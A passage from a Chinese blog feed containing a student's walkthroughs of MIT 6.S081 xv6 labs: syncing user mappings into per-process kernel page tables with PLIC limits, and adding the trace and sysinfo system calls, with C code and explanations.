usertests</code>检查</p><p>这个检查的过程非常长，在我这运行了100s，一度以为是死锁了写错了</p></blockquote><p><img src="https://img-blog.csdnimg.cn/img_convert/e0367c3cf45ab24568962b4078206ad0.png" alt="image-20230817200806108"></p><h1 id="Simplify"><a href="#Simplify" class="headerlink" title="Simplify"></a>Simplify</h1><h2 id="task-2"><a href="#task-2" class="headerlink" title="task"></a>task</h2><ol><li>将用户的映射都加入到进程的内核页表中</li><li>将<code>vm.c</code>中的<code>copyin</code>函数的函数体替换成对<code>copyin_new</code>的调用，对<code>copyinstr</code>也是一样的处理</li><li><code>make grade</code>通过就说明成功了</li><li>你需要修改xv6使得用户进程的虚拟地址不会超过<code>PLIC</code>寄存器的地址</li></ol><h2 id="hints-2"><a href="#hints-2" class="headerlink" title="hints"></a>hints</h2><ol><li><p>先确定<code>copyin</code>正确，再去尝试<code>copyinstr</code></p></li><li><p>每次内核改变用户的映射时，都要同步修改到这个用户的内核页表</p><p> 包括<code>fork</code> <code>exec</code> <code>sbrk</code></p></li><li><p>不要忘记了在<code>userinit</code>中将第一个进程的用户也更新到他的内核页表</p></li><li><p><code>PTE_U</code>不要也拷贝到了kernel的内核页表中</p></li><li><p>不要忘记了<code>PLIC</code>的限制</p></li></ol><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/20231224204133.png" alt="20231224204133"></p><h2 id="错误之路"><a href="#错误之路" class="headerlink" title="错误之路"></a>错误之路</h2><ol><li>如何控制用户进程申请的最大虚拟地址，在<code>umalloc.c</code>文件的<code>morecore</code>函数中对<code>sbrk</code>函数的返回值进行判断</li><li>修改<code>fork</code>函数，主要是修改<code>uvmcopy</code>函数，在它使用<code>mappages</code>给<code>new</code>增加页表项时，成功后给<code>kernal</code>也增加页表项</li><li>修改<code>exec</code>函数，有好多地方需要修改，一个一个来<ol><li>调用了<code>proc_pagetable</code>去创建一个只有顶部两个和trap相关的页面，其他的都为空，这应该相当于清空，内核该怎么办呢？也清空自己吗。目前是清空原有的内核页表，然后生成一个新的内核页表，最后将内核栈的映射加上去</li><li><code>uvmalloc</code>中增加对kernel的操作</li><li><code>uvmclear</code>中增加对kernel的操作，这个好像不需要</li></ol></li></ol><h2 id="第二次尝试"><a href="#第二次尝试" class="headerlink" title="第二次尝试"></a>第二次尝试</h2><ol><li><p>在<code>vm.c</code>中创造函数<code>copy_to_kernal</code>和<code>dealloc_kernal</code>，其中的copy函数会将用户标志位给取消</p><p> <code>copy_to_kernel</code>函数如下</p><p> 有几个细节，或者说是有点坑的地方</p><ol><li>不要忽略了<code>mappages</code>函数失败的情况，这个函数失败，说明<code>walk</code>失败，进一步说明是<code>kalloc</code>失败，这本质上就是没有空闲页面了。这时候也不应该用<code>panic</code>报错，而是返回一个特殊值，表示内存不够用了，并且将已经记录的地址映射删除。如果不处理这种情况，会在<code>sbrkmuch</code>这个测试点过不去。</li><li>为什么要用<code>PGROUNDUP</code>，可以不用吗？或者可以用<code>PGROUNDDOWN</code>吗<ol><li>首先，如果每次给的地址都是页面大小的倍数，那用不用都可以</li><li>之所以使用向上取整，而不是向下取整，个人认为是因为<code>oldsz</code>在的那个页面本来就存在于内核页表中，不需要复制，所以就从向上取整的那个开始</li></ol></li></ol> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64 <span class="hljs-title function_">copy_to_kernal</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> user, <span class="hljs-type">pagetable_t</span> kernel, uint64 oldsize, uint64 newsize)</span> &#123;<br>    uint64 va, pa;<br>    <span class="hljs-type">pte_t</span> *pte;<br>    uint flags;<br>    <span class="hljs-keyword">for</span> (va = PGROUNDUP(oldsize); va &lt; newsize; va += PGSIZE) &#123;<br>        pte = walk(user, va, <span class="hljs-number">0</span>);<br>        pa = PTE2PA(*pte);<br>        flags = PTE_FLAGS(*pte);<br>        flags &amp;= ~PTE_U;<br>        <span class="hljs-keyword">if</span> (mappages(kernel, va, PGSIZE, pa, flags) != <span class="hljs-number">0</span>) &#123;<br>            uvmunmap(kernel, PGROUNDUP(oldsize), (va - PGROUNDUP(oldsize)) / PGSIZE, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> newsize;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>dealloc_kernal</code>函数如下，基本照抄<code>uvmdealloc</code>函数，只需要将<code>uvmunmap</code>最后的<code>dofree</code>参数改成0就行了</p><p> 这个函数的本质就是将用户进程的虚拟地址给free掉了，没有影响内核本身的那些外设和代码数据</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64 <span class="hljs-title function_">dealloc_kernal</span><span class="hljs-params">(<span class="hljs-type">pagetable_t</span> kernel, uint64 oldsz, uint64 newsz)</span> &#123;<br>    <span class="hljs-keyword">if</span> (newsz &gt;= oldsz)<br>        <span class="hljs-keyword">return</span> oldsz;<br><br>    <span class="hljs-keyword">if</span> (PGROUNDUP(newsz) &lt; PGROUNDUP(oldsz)) &#123;<br>        <span class="hljs-type">int</span> npages = (PGROUNDUP(oldsz) - PGROUNDUP(newsz)) / PGSIZE;<br>        uvmunmap(kernel, PGROUNDUP(newsz), npages, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> newsz;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><code>fork</code>，在父进程拷贝内存到子进程之后，调用<code>copy_to_kernel</code>函数</p><p> 注意，也要判断是否失败</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Copy user memory from parent to child. // 将child的用户态页表复制到child的内核页表</span><br><span class="hljs-keyword">if</span> (uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span> || copy_to_kernal(np-&gt;pagetable, np-&gt;kernel_pgtbl, <span class="hljs-number">0</span>, p-&gt;sz) &lt; <span class="hljs-number">0</span>) &#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>exec</code>，找个合适的位置（进程的页表被初始化完之后就行），先释放再拷贝</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">dealloc_kernal(p-&gt;kernel_pgtbl, oldsz, <span class="hljs-number">0</span>);<br>copy_to_kernal(p-&gt;pagetable, p-&gt;kernel_pgtbl, <span class="hljs-number">0</span>, sz);<br></code></pre></td></tr></table></figure><p> <code>sbrk</code>应该是在<code>sys_sbrk</code>中调用的<code>growproc</code>函数，分别在分配和释放的情况下调用函数。其中在分配的时候，如果我们的copy函数失败了，还需要将进程的用户态页表的映射给抹去再返回-1</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">if</span> ((sz = uvmalloc(p-&gt;pagetable, sz, sz + n)) == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">// 内核页表</span><br>    <span class="hljs-keyword">if</span> (copy_to_kernal(p-&gt;pagetable, p-&gt;kernel_pgtbl, oldsz, oldsz + n) &lt; <span class="hljs-number">0</span>) &#123;<br>        uvmdealloc(p-&gt;pagetable, sz, oldsz);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (n &lt; <span class="hljs-number">0</span>) &#123;<br>    sz = uvmdealloc(p-&gt;pagetable, sz, sz + n);<br>    <span class="hljs-comment">// 内核页表</span><br>    dealloc_kernal(p-&gt;kernel_pgtbl, oldsz, oldsz + n);<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>userinit</code>，在<code>uvminit</code>之后调用拷贝函数</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">copy_to_kernal(p-&gt;pagetable, p-&gt;kernel_pgtbl, <span class="hljs-number">0</span>, PGSIZE);<br></code></pre></td></tr></table></figure></li><li><p><code>PLIC</code>的限制</p><ol><li><p>将<code>CLINT</code>变成只有最初的内核页表才分配，后面申请的内核页表都不用，这样每个进程的内核页表就不会在<code>PLIC</code>下面还有虚拟地址了。至于这这个<code>CLINT</code>为什么在只需要在最初的内核页表需要，现在还不太清楚，好像后面会讲的，就当个黑盒子使用了</p><p> 具体实现就是将<code>kvmmap(kernel_pagetable, CLINT, CLINT, 0x10000, PTE_R | PTE_W);</code>从task2中定义的<code>init_kernel_pgtbl</code>中移到<code>kvminit</code></p></li><li><p>控制用户进程的地址空间，不要超过了<code>PLIC</code>，我觉得这里需要在两个地方进行控制，第一个是<code>exec</code>函数，即进程初始的虚拟地址空间大小，第二个是<code>sbrk</code>函数，即进程在运行的过程中动态申请内存空间，也不能超过<code>PLIC</code>，这个就体现在<code>sbrk</code>调用的<code>growproc</code>函数了</p><ol><li><p>在<code>exec</code>中，是在一个for循环里不断通过<code>uvmalloc</code>给这个进程的用户页表建议映射的，因此在这个函数后面加上一个判断即可</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((sz1 = uvmalloc(pagetable, sz, ph.vaddr + ph.memsz)) == <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">goto</span> bad;<br><span class="hljs-keyword">if</span> (sz1 &gt;= PLIC) &#123;<br>    <span class="hljs-keyword">goto</span> bad;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在<code>growproc</code>中，先判断一下当前的大小加上n是否超过了<code>PLIC</code></p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (PGROUNDUP(sz + n) &gt;= PLIC) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><blockquote><p>至此，硬核的内容结束了</p></blockquote><p> 但是如果想拿到满分，还需要在项目根目录下创建两个txt文件，一个叫<code>time.txt</code>，一个叫<code>answers-pgtbl</code>，一个用来记录完成lab的总耗时，一个用来回答问题，<del>可以直接乱填</del></p></li></ol>]]></content>
    
    
    <categories>
      
      <category>Operating System</category>
      
      <category>MIT6.S081</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Operating System</tag>
      
      <tag>MIT6.S081</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>6.s081_lab2</title>
    <link href="/2023/08/15/6-s081-lab2/"/>
    <url>/2023/08/15/6-s081-lab2/</url>
    
    <content type="html"><![CDATA[<h1 id="PreRead"><a href="#PreRead" class="headerlink" title="PreRead"></a>PreRead</h1><hr><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><ul><li><input checked="" disabled="" type="checkbox"> xv6课本<ul><li><input checked="" disabled="" type="checkbox"> 第二章:Operating system organization</li><li><input checked="" disabled="" type="checkbox"> 第四章<ul><li><input checked="" disabled="" type="checkbox"> 4.3:Code: Calling system calls</li><li><input checked="" disabled="" type="checkbox"> 4.4:Code: System call arguments</li></ul></li></ul></li><li><input checked="" disabled="" type="checkbox"> 源文件<ul><li><input checked="" disabled="" type="checkbox"> 系统调用的用户空间代码：user&#x2F;user.h和user&#x2F;usys.pl</li><li><input checked="" disabled="" type="checkbox"> 内核空间代码：kernel&#x2F;syscall.h、kernel&#x2F;syscall.c</li><li><input checked="" disabled="" type="checkbox"> 与进程相关的代码是kernel&#x2F;proc.h和kernel&#x2F;proc.c。</li></ul></li></ul><hr><h2 id="4-3-Code-Calling-system-calls"><a href="#4-3-Code-Calling-system-calls" class="headerlink" title="4.3 Code: Calling system calls"></a>4.3 Code: Calling system calls</h2><p>exec系统调用在内核中是如何实现的</p><ol><li>用户的代码将exec函数的参数放在了寄存器a0和a1，并且将系统调用号放在了寄存器a7<ol><li>系统调用号匹配了syscalls数组的某一个项，这个数组是一系列的函数指针</li><li>ecall指令陷入内核，执行uservec，usertrap，然后执行了syscall</li></ol></li><li>syscall函数根据系统调用号，找到了sys_exec函数，并调用这个函数</li><li>当sys_exec函数结束之后，syscall会将它的返回值放在p-&gt;trapframe-&gt;a0，然后会把这个值作为用户调用exec的返回值。一般情况下，risc-v的c语言的函数的返回值都放在a0寄存器，并且0代表成功，-1代表失败</li></ol><h2 id="4-4-Code-System-call-arguments"><a href="#4-4-Code-System-call-arguments" class="headerlink" title="4.4 Code: System call arguments"></a>4.4 Code: System call arguments</h2><p>系统调用是如何找到用户传递的参数呢？</p><ol><li>参数通常是存放在寄存器中</li><li>内核trap的代码将用户的寄存器保存到当前进程的trap页面，内核可以找到这个页面</li><li>通过argint，argaddr，argfd可以分别从trap页面读出int，pointer，fd</li><li>调用argraw可以取出正确的被保存的用户寄存器</li></ol><p>系统调用的挑战</p><ol><li>用户调用的程序是有问题的</li><li>内核和用户空间的虚拟地址映射可能不同</li></ol><p>fetchstr函数</p><ol><li>从用户空间读出文件名</li><li>调用了copyinstr处理hard工作</li></ol><h1 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h1><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c">$ trace <span class="hljs-number">32</span> grep hello README<br><span class="hljs-number">3</span>: syscall read -&gt; <span class="hljs-number">1023</span><br><span class="hljs-number">3</span>: syscall read -&gt; <span class="hljs-number">966</span><br><span class="hljs-number">3</span>: syscall read -&gt; <span class="hljs-number">70</span><br><span class="hljs-number">3</span>: syscall read -&gt; <span class="hljs-number">0</span><br>$<br>$ trace <span class="hljs-number">2147483647</span> grep hello README<br><span class="hljs-number">4</span>: syscall trace -&gt; <span class="hljs-number">0</span><br><span class="hljs-number">4</span>: syscall exec -&gt; <span class="hljs-number">3</span><br><span class="hljs-number">4</span>: syscall open -&gt; <span class="hljs-number">3</span><br><span class="hljs-number">4</span>: syscall read -&gt; <span class="hljs-number">1023</span><br><span class="hljs-number">4</span>: syscall read -&gt; <span class="hljs-number">966</span><br><span class="hljs-number">4</span>: syscall read -&gt; <span class="hljs-number">70</span><br><span class="hljs-number">4</span>: syscall read -&gt; <span class="hljs-number">0</span><br><span class="hljs-number">4</span>: syscall close -&gt; <span class="hljs-number">0</span><br>$<br>$ grep hello README<br>$<br>$ trace <span class="hljs-number">2</span> usertests forkforkfork<br>usertests starting<br>test forkforkfork: <span class="hljs-number">407</span>: syscall fork -&gt; <span class="hljs-number">408</span><br><span class="hljs-number">408</span>: syscall fork -&gt; <span class="hljs-number">409</span><br><span class="hljs-number">409</span>: syscall fork -&gt; <span class="hljs-number">410</span><br><span class="hljs-number">410</span>: syscall fork -&gt; <span class="hljs-number">411</span><br><span class="hljs-number">409</span>: syscall fork -&gt; <span class="hljs-number">412</span><br><span class="hljs-number">410</span>: syscall fork -&gt; <span class="hljs-number">413</span><br><span class="hljs-number">409</span>: syscall fork -&gt; <span class="hljs-number">414</span><br><span class="hljs-number">411</span>: syscall fork -&gt; <span class="hljs-number">415</span><br>...<br>$   <br></code></pre></td></tr></table></figure><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><ol><li><p>增加一个<code>trace</code>系统调用</p></li><li><p>用法<code>trace mask 常规的指令</code></p><p> 比如<code>trace 32 grep hello README</code></p></li><li><p>功能：在<code>grep hello README</code>的过程中，使用了很多系统调用</p><p> 通过<code>mask</code>为1的pos可以找到我们需要关注的系统调用</p><p> <code>1 &lt;&lt; SYS_fork</code>，而<code>SYS_fork</code>记录在<code>kernel/syscall.h</code></p></li><li><p>我们需要把<code>mask</code>标记的系统调用都打印一下</p><p> 打印的格式如下</p><p> <code>pid: syscall 系统调用的名字 -&gt; 返回值</code></p><p> 比如<code>3: syscall read -&gt; 1023</code></p></li><li><p>fork出的子进程也同样要打印，不相关的进程不要打印</p></li></ol><h2 id="hints"><a href="#hints" class="headerlink" title="hints"></a>hints</h2><ol><li><p>将<code>$U/_trace</code>加入makefiel的UPROGS</p></li><li><p>在<code>user/user.h</code>增加原型</p><p> 在<code>user/usys.pl</code>增加</p><p> 在<code>kernel/syscall.h</code>增加系统调用号</p></li><li><p>在<code>kernel/sysproc.c</code>中增加<code>sys_trace()</code>函数实现系统调用</p><p> 这个函数将参数放在<code>kernel/proc.h</code>的<code>proc</code>结构体的一个新的变量中</p><p> 通过查看<code>kernel/syscall.c</code>的例子可以看到怎么从用户空间提取系统调用参数</p></li><li><p>修改<code>kernel/proc.c</code>中的<code>fork()</code>函数完成父进程将mask传递给子进程</p></li><li><p>修改<code>kernel/syscall.c</code>中的<code>syscall()</code>去打印我们的输出</p><p> 不懂：You will need to add an array of syscall names to index into</p></li></ol><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><blockquote><p>自己是没能独立做出来，一个是对xv6的系统调用机制不熟悉，还有一个是误解了hints的第3点意思，这一点非常关键</p></blockquote><p>这个lab操作起来其实非常简单，代码量非常小，但是需要好好地想清楚</p><h3 id="先看用户的trace函数"><a href="#先看用户的trace函数" class="headerlink" title="先看用户的trace函数"></a>先看用户的trace函数</h3><p>这个trace函数其实xv6已经提供给我们了，就在<code>user/trace.c</code>文件中，先看看这个用户的trace函数的结构，有利于理清思路</p><p>第一段有用的代码在这里</p><ol><li>可以发现，这就直接调用了trace函数，就使用了mask一个变量，真正要检测的程序并没有执行。因此，可以猜测，trace并不是边exec边设置，而是提前就设置好。这样在后面exec使用系统调用的时候，就直接输出信息</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (trace(atoi(argv[<span class="hljs-number">1</span>])) &lt; <span class="hljs-number">0</span>) &#123;<br>  <span class="hljs-built_in">fprintf</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;%s: trace failed\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>第二段代码在这里</p><p>这个代码其实没什么新奇的，就是调用了exec函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(i = <span class="hljs-number">2</span>; i &lt; argc &amp;&amp; i &lt; MAXARG; i++)&#123;<br>  nargv[i<span class="hljs-number">-2</span>] = argv[i];<br>&#125;<br>exec(nargv[<span class="hljs-number">0</span>], nargv);<br></code></pre></td></tr></table></figure><h3 id="trace系统调用到底是怎么作用的呢？"><a href="#trace系统调用到底是怎么作用的呢？" class="headerlink" title="trace系统调用到底是怎么作用的呢？"></a>trace系统调用到底是怎么作用的呢？</h3><p>hints的第3,4,5点给出了答案</p><ol><li>首先，第3点告诉我们，我们需要定义一个<code>sys_trace</code>函数，这个函数会将mask存在proc结构体的一个新的变量中。<ol><li>这个新的变量就很关键了，意思是让我们自己去修改proc结构体的代码，增加一个新的变量，表示mask。</li><li>然后我们在sys_trace中设置这个mask。<ol><li>系统提供了argint函数，这个函数可以用来设置proc中的int的值</li><li>由preread中的4.3节可知，运行到sys_trace中时，这个系统调用的参数存放在寄存器a0中</li></ol></li></ol></li></ol><p>因此，sys_trace函数如下，其中trace_mask就是在proc结构体中新增的一个int变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">uint64<br><span class="hljs-title function_">sys_trace</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> &#123;<br>    <span class="hljs-comment">// 这里的0代表将a0的值赋给trace_mask</span><br>    argint(<span class="hljs-number">0</span>, &amp;(myproc()-&gt;trace_mask));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ol start="2"><li><p>然后就是hint的第4点，告诉我们，要修改fork函数，使得子进程也继承父进程的trace特性，其实就是继承trace_mask。我觉得<code>np-&gt;trace_mask = p-&gt;trace_mask;</code>放在np被创建之后，np释放锁之前的位置都可以。</p></li><li><p>最后就是hint的第5点，在syscall函数中打印信息，搞了这么久，其实就是为了完成这个。</p><ol><li><p>在成功执行了对应的系统调用之后，判断这个系统调用是否需要trace打印<code>if ((1 &lt;&lt; num) &amp; p-&gt;trace_mask)</code></p></li><li><p>如果满足条件的话，那就<code>printf(&quot;%d: syscall %s -&gt; %d\n&quot;, p-&gt;pid, syscalls_name[num], p-&gt;trapframe-&gt;a0);</code>。其中最后一个参数是这个系统调用的返回值</p></li><li><p>为了方便操作，增加了一个syscalls_name数组，这个数组的写法很神奇</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *syscalls_name[] = &#123;<br>    [SYS_fork] <span class="hljs-string">&quot;fork&quot;</span>,<br>    [SYS_exit] <span class="hljs-string">&quot;exit&quot;</span>,<br>    [SYS_wait] <span class="hljs-string">&quot;wait&quot;</span>,<br>    [SYS_pipe] <span class="hljs-string">&quot;pipe&quot;</span>,<br>    [SYS_read] <span class="hljs-string">&quot;read&quot;</span>,<br>    [SYS_kill] <span class="hljs-string">&quot;kill&quot;</span>,<br>    [SYS_exec] <span class="hljs-string">&quot;exec&quot;</span>,<br>    [SYS_fstat] <span class="hljs-string">&quot;fstat&quot;</span>,<br>    [SYS_chdir] <span class="hljs-string">&quot;chdir&quot;</span>,<br>    [SYS_dup] <span class="hljs-string">&quot;dup&quot;</span>,<br>    [SYS_getpid] <span class="hljs-string">&quot;getpid&quot;</span>,<br>    [SYS_sbrk] <span class="hljs-string">&quot;sbrk&quot;</span>,<br>    [SYS_sleep] <span class="hljs-string">&quot;sleep&quot;</span>,<br>    [SYS_uptime] <span class="hljs-string">&quot;uptime&quot;</span>,<br>    [SYS_open] <span class="hljs-string">&quot;open&quot;</span>,<br>    [SYS_write] <span class="hljs-string">&quot;write&quot;</span>,<br>    [SYS_mknod] <span class="hljs-string">&quot;mknod&quot;</span>,<br>    [SYS_unlink] <span class="hljs-string">&quot;unlink&quot;</span>,<br>    [SYS_link] <span class="hljs-string">&quot;link&quot;</span>,<br>    [SYS_mkdir] <span class="hljs-string">&quot;mkdir&quot;</span>,<br>    [SYS_close] <span class="hljs-string">&quot;close&quot;</span>,<br>    [SYS_trace] <span class="hljs-string">&quot;trace&quot;</span>,<br>&#125;;<br></code></pre></td></tr></table></figure></li></ol></li></ol><p>最后，就是hints中1和2的dirtywork，不过也更能学到系统调用的流程，</p><ol><li><p><code>user.h</code>中增加系统调用<code>int trace(int);</code>的声明</p></li><li><p><code>usys.pl</code>中增加<code>entry(&quot;trace&quot;);</code></p></li><li><p><code>syscall.h</code>中增<code>\#define SYS_trace  22</code></p></li><li><p>hints没有提到的，<code>syscall.c</code>的syscalls数组中增加一项<code>[SYS_trace] sys_trace,</code></p></li></ol><h2 id="重新捋一遍系统调用的过程"><a href="#重新捋一遍系统调用的过程" class="headerlink" title="重新捋一遍系统调用的过程"></a>重新捋一遍系统调用的过程</h2><p>就从syscall函数开始吧，之前的还没学，我是菜狗</p><ol><li>syscall函数会通过调用它的用户进程的proc结构体获取这个进程存放在trapframe中的各种信息，其中在syscall中使用的是a7寄存器，存放的是系统调用号</li><li>然后syscall根据这个系统调用号，在syscall.c文件中定义了一个syscalls数组，这个数组可以通过系统调用号找到对应的系统调用函数，而这个系统调用函数是我们在sysproc.c文件中定义的sys_xxx函数。至此，就去执行具体的系统调用函数了</li></ol><p>除此之外，还有一些比较隐秘的知识点</p><ol><li><p>用户进程在请求系统调用之后，是会把自己的内存和寄存器信息存放在trapframe中。其中比较重要的就是，会把系统调用的参数给放在从a0开始的寄存器，会把系统调用号放在a7寄存器。</p></li><li><p>通过argint，argaddr，argfd argstr可以分别从trap页面读出int，pointer，fd，字符串</p><p> 调用argraw可以取出正确的被保存的用户寄存器，上面所提的arg系列函数基本都调用了argraw实现功能</p></li><li><p>syscall函数调用的sys_xxx系列的函数都是没有显式的定义参数的，都需要我们自己直接操作trapframe或者间接通过arg获取用户传给我们的信息</p></li></ol><p>留坑</p><blockquote><p>现在还没有怎么很清楚是如何从用户态的trace函数跳到syscall函数的，希望在后面的课程中弄懂</p></blockquote><h1 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h1><h2 id="任务-1"><a href="#任务-1" class="headerlink" title="任务"></a>任务</h2><ol><li>增加一个系统调用sysinfo，收集正在运行的系统的信息</li><li>这个系统调用的参数是一个kernel&#x2F;sysinfo.h中定义的struct sysinfo的指针</li><li>内核需要填充这个struct的这几个部分<ol><li>freemem：free memory的字节数</li><li>nproc：状态不是UNUSED的进程的数量</li><li>如果sysinfotest输出sysinfotest: OK，则代表通过</li></ol></li></ol><h2 id="hints-1"><a href="#hints-1" class="headerlink" title="hints"></a>hints</h2><ol><li>将$U&#x2F;_sysinfotest添加到Makefile的UPROGS</li><li>和上一个任务一样完成各自声明，在<code>user.h</code>中，需要提前声明</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span>;</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">sysinfo</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> sysinfo *)</span>;<br></code></pre></td></tr></table></figure><ol start="3"><li><p><code>sysinfo</code>需要赋值struct回用户空间</p><p> 看<code>kernel/sysfile.c</code>的<code>sys_fstat() </code>  以及  <code>kernel/file.c</code>的<code>filestat() </code>函数</p><p> 学习怎么使用<code>copyout()</code>函数</p><p> <code>copyout(p-&gt;pagetable, addr, (char *)&amp;st, sizeof(st)</code></p><ol><li>第一个参数是用户进程的页表，p通过muproc得到</li><li>addr表示要用户空间的某个地址</li><li>第三个参数是要复制的内核数据的地址</li><li>第四个数据是复制多少字节</li></ol></li><li><p>为了统计内存的数量，在<code>kernel/kalloc.c</code>增加一个函数</p></li><li><p>为了统计进程的数量，在<code>kernel/proc.c</code>中增加一个函数</p></li></ol><blockquote><p>补充一个hints，新增加的这两个函数需要在<code>defs.h</code>中声明</p></blockquote><h2 id="思路-1"><a href="#思路-1" class="headerlink" 